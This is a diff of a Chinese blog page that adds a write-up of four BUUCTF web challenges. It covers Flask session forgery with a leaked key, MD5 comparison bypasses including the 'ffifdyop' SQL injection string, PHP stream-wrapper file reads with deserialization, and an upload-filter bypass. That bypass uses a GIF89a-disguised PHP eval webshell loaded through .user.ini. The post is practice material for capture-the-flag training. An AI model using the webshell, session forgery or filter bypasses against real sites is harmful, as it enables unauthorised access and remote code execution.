@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="资源分享, 计算机 网络安全 渗透测试">
+    <meta name="keywords" content="buuctf练习：21-30, 计算机 网络安全 渗透测试">
     <meta name="description" content="本科 | 软件工程 | 网络安全">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>资源分享 | huhu</title>
+    <title>buuctf练习：21-30 | huhu</title>
 
     <link rel="icon" type="image/jpeg" href="/medias/tx.jpg">
 
@@ -429,12 +429,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928014621.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/img/11.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">资源分享</h1>
+                    <h1 class="description center-align post-title">buuctf练习：21-30</h1>
                 </div>
             </div>
         </div>
@@ -553,12 +553,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/buu%E7%BB%83%E4%B9%A0/">
+                                <span class="chip bg-color">buu练习</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -567,28 +580,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-07-19
+                    2022-01-30
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-01-13
+                    2022-02-04
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    1.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    6 分
                 </div>
                 
 
@@ -606,7 +619,191 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="21-HCTF-2018-admin"><a href="#21-HCTF-2018-admin" class="headerlink" title="21.[HCTF 2018]admin"></a>21.[HCTF 2018]admin</h2><p>刚开始还以为是二次注入，但是发现不行。随便注册个号进去后，发现更改密码的部分存在源码，下载后看到这样一段代码：</p>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html">//index.html
+{% include('header.html') %}
+{% if current_user.is_authenticated %}
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Hello {{ session['name'] }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
+{% endif %}
+{% if current_user.is_authenticated and session['name'] == 'admin' %}
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>hctf{xxxxxxxxx}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
+{% endif %}
+<span class="token comment">&lt;!-- you are not admin --&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Welcome to hctf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
+
+{% include('footer.html') %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到根据session中的<code>name</code>值来确定是不是admin,所以想到<font color="#FF5E3A" size="3">flask session 伪造</font>，而<font color="#FF5E3A" size="3">flask的session是在客户端的</font>，因此可以尝试进行伪造，但是伪造需要<font color="#FF5E3A" size="3">密钥</font>，发现密钥就在我们下载的文件夹里：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054285.png"></p>
+<p>所以接下来先解密session，这里可以用一个脚本：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#用法在终端输入：python session_decode.py your-session</span>
+
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> zlib
+<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode
+<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> session_json_serializer
+<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode
+ 
+<span class="token keyword">def</span> <span class="token function">decryption</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload<span class="token punctuation">,</span> sig <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
+    payload<span class="token punctuation">,</span> timestamp <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
+ 
+    decompress <span class="token operator">=</span> <span class="token boolean">False</span>
+    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+        decompress <span class="token operator">=</span> <span class="token boolean">True</span>
+ 
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        payload <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not base64 decode the payload because of '</span>
+                         <span class="token string">'an exception'</span><span class="token punctuation">)</span>
+ 
+    <span class="token keyword">if</span> decompress<span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            payload <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not zlib decompress the payload before '</span>
+                             <span class="token string">'decoding the payload'</span><span class="token punctuation">)</span>
+ 
+    <span class="token keyword">return</span> session_json_serializer<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+ 
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>decryption<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   
+    
+<span class="token comment">#解密得到：{'_fresh': True, '_id': b'd36b0289542c58199f0077265e16573dce66036e3543284e1c3b4be2fbeeb15674be6453b16bf51b3acbb744a96506026944dc1b663f8adb7673c5ebaceeb6be', 'csrf_token': b'16c4ef7f11713de97039735f894c40b4846df5de', 'image': b'j6il', 'name': '1', 'user_id': '11'}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后把name的值改为admin，在使用密钥加密一下得到session值。加密脚本（也可以解密）：</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">git clone https://github.com/noraj/flask-session-cookie-manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后使用命令：</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ python{2,3} flask_session_cookie_manager{2,3}.py encode -s '.{y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d' -t '{"number":"326410031505","username":"admin"}'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054287.png"></p>
+<p>将加密后的session重新添加到cookie中得到flag：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054289.png"></p>
+<h2 id="22-BJDCTF2020-Easy-MD5"><a href="#22-BJDCTF2020-Easy-MD5" class="headerlink" title="22.[BJDCTF2020]Easy MD5"></a>22.[BJDCTF2020]Easy MD5</h2><p>这个题刚开始直接注啥也没有，看了一下响应头发现有东西：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054290.png"></p>
+<p>搜索查到MD5()true参数漏洞，发现<code>ffifdyop</code>会造成漏洞：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054291.png"></p>
+<p>输出的开头是’or’6xxxxxx 在数据库语句里就构成了select * from ‘admin’ where password= ‘’or’6xxxxxx ’ 变成永真式。然后来到levels91.php，查看源码看到：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token comment">// wow, glzjin wants a girl friend.</span>
+<span class="token operator">--</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>就是简单的弱比较，绕过的答案有很多种。这里就用数组绕过:<code>a[]=1&amp;b[]=2</code>，进入到levell14.php：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span>
+
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'param1'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>和上一个差不多，无非就是post传参以及转别为了强比较，同样可以使用上面的数组绕过，得到flag。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054292.png"></p>
+<p><font color="#FF5E3A" size="3">md5比较绕过：</font></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ainsliaea/p/15126218.html">https://www.cnblogs.com/ainsliaea/p/15126218.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">https://blog.csdn.net/CSDNiamcoming/article/details/108837347</a></p>
+<h2 id="23-ZJCTF-2019-NiZhuanSiWei"><a href="#23-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="23.[ZJCTF 2019]NiZhuanSiWei"></a>23.[ZJCTF 2019]NiZhuanSiWei</h2><p>源码：<a target="_blank" rel="noopener" href="https://github.com/CTFTraining/zjctf_2019_final_web_nizhuansiwei/">https://github.com/CTFTraining/zjctf_2019_final_web_nizhuansiwei/</a></p>
+<p>考察的是PHP伪协议、以及反序列化的魔法函数。（重点是<code>data协议</code>容易忘记）</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
+<span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br&gt;&lt;h1&gt;"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/h1&gt;&lt;/br&gt;"</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Not now!"</span><span class="token punctuation">;</span>
+        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//useless.php</span>
+        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span> <span class="token comment">//会触发魔法函数__tostring</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter important">?&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先是text参数，但是我们没有其他的文件可以读，所以使用<code>data协议</code>：</p>
+<p><strong>条件</strong>：</p>
+<ul>
+<li><code>allow_url_fopen</code>:on</li>
+<li><code>allow_url_include</code> :on</li>
+</ul>
+<p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
+<p><strong>用法</strong>：</p>
+<pre class="line-numbers language-awk" data-language="awk"><code class="language-awk">data://text/plain,
+data://text/plain;base64,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>相关伪协议i详细介绍：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p>
+<p>所以payload:?text=data://text/plain,welcome to the zjctf，就可以满足第一个判断。然后就要读useless.php，如果直接读无法显示，所以伪协议读取：file=php://filter/read=convert.base64-encode/resource=useless.php，读到之后解密：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
+
+<span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span>  <span class="token comment">//flag.php  </span>
+    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
+            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>  
+    <span class="token punctuation">}</span>  
+<span class="token punctuation">}</span>  
+<span class="token delimiter important">?&gt;</span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p> 要想读到flag，就把file赋值为flag.php，然后序列化作为参数password值传进去就好。</p>
+<h2 id="24-SUCTF-2019-CheckIn"><a href="#24-SUCTF-2019-CheckIn" class="headerlink" title="24.[SUCTF 2019]CheckIn"></a>24.[SUCTF 2019]CheckIn</h2><p>又是一个文件上传题，不过有难倒我了。首先这个题有源，先来分析一下：</p>
+<p>源码地址：<a target="_blank" rel="noopener" href="https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn">https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn</a></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">if (isset($_POST["upload"])) {
+    $tmp_name = $_FILES["fileUpload"]["tmp_name"];
+    $name = $_FILES["fileUpload"]["name"];
+    if (!$tmp_name) {
+        die("filesize too big!");
+    }
+    if (!$name) {
+        die("filename cannot be empty!");
+    }
+    //文件后缀不能有ph开头的，并且忽略了大小写
+    $extension = substr($name, strrpos($name, ".") + 1);
+    if (preg_match("/ph|htacess/i", $extension)) {
+        die("illegal suffix!");
+    }
+    //文件内容中不能有"&lt;?"
+    if (mb_strpos(file_get_contents($tmp_name), "&lt;?") !== FALSE) {
+        die("<span class="token entity named-entity" title="<">&amp;lt;</span>? in contents!");
+    }
+    //exif_imagetype() 读取一个图像的第一个字节并检查其签名。可以利用利用GIF89a文件头绕过（对应jpg后缀）
+    $image_type = exif_imagetype($tmp_name);
+    if (!$image_type) {
+        die("exif_imagetype:not image!");
+    }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>所以从上面的过滤我们可以知道要上传图片木马，制作一个图片木马shell.jpg：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a
+<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token single-quoted-string string">'php'</span><span class="token operator">&gt;</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>但是蚁剑不能连接图片文件，所以还不能直接连，在这里就卡着了。看了别人的wp可以上传一个配置文件<code>.user.ini</code></p>
+<pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">GIF89a                  
+<span class="token constant">auto_prepend_file</span><span class="token attr-value"><span class="token punctuation">=</span>shell.jpg </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>参考链接：<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
+<p><strong>使用条件：</strong><br> (1)服务器脚本语言为PHP<br> (2)<font color="#FF5E3A" size="3">对应目录下面有可执行的php文件</font><br> (3)服务器使用CGI／FastCGI模式</p>
+<p><code>.user.ini</code>实际上就是一个可以由用户“自定义”的<code>php.ini</code>，我们可以自定义除了<code>PHP_INI_SYSTEM</code>以外的模式，在执行php代码之前，系统会对<code>.user.ini</code>先做一个执行，然后才执行其他的php文件。</p>
+<p>我们这边利用<code>.user,ini</code>先执行<code>auto_prepend_file</code>函数，<code>auto_prepend_file</code>表示在php程序加载第一个php代码前加载的php文件，也就是先加载了shell.jpg里面的文件，即一句话木马。</p>
+<p>把这两个文件上传之后就可以使用蚁剑连接了，这里记住访问的时<code>index.php</code>！这样才有用，就是使用条件的第二个。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054293.png"></p>
+<hr>
+<img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054294.jpg" style="zoom:150%;">
+
                 
             </div>
             <hr/>
@@ -622,7 +819,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">huhu</a>
+                    <a href="/about" rel="external nofollow noreferrer">myh</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -632,7 +829,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://huhu-myh.github.io/resource/index.html">https://huhu-myh.github.io/resource/index.html</a>
+                    <a href="https://huhu-myh.github.io/posts/myh10012.html">https://huhu-myh.github.io/posts/myh10012.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -645,7 +842,7 @@
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">huhu</a>
+                    <a href="/about" target="_blank">myh</a>
                     !
                 </span>
             </div>
@@ -669,7 +866,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/buu%E7%BB%83%E4%B9%A0/">
+                                    <span class="chip bg-color">buu练习</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -1144,34 +1345,45 @@ new Valine({
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/resource/index.html">
+                <a href="/posts/myh10012.html">
                     <div class="card-image">
                         
+                        <img src="/medias/img/11.jpg" class="responsive-img" alt="buuctf练习：21-30">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928014621.jpg" class="responsive-img" alt="资源分享">
-                        
-                        <span class="card-title">资源分享</span>
+                        <span class="card-title">buuctf练习：21-30</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            准备一天一题buu~。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-07-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-30
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            huhu
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/buu%E7%BB%83%E4%B9%A0/">
+                        <span class="chip bg-color">buu练习</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -1179,37 +1391,47 @@ new Valine({
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/resource/index.html">
+                <a href="/posts/myh10011.html">
                     <div class="card-image">
                         
+                        <img src="/medias/img/10.jpg" class="responsive-img" alt="Linux学习-第五章">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928014621.jpg" class="responsive-img" alt="资源分享">
-                        
-                        <span class="card-title">资源分享</span>
+                        <span class="card-title">Linux学习-第五章</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            本章先学习进阶bash shell命令~。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-07-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-25
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            huhu
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AD%A6%E4%B9%A0/" class="post-category">
+                                    学习
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/linux/">
+                        <span class="chip bg-color">linux</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
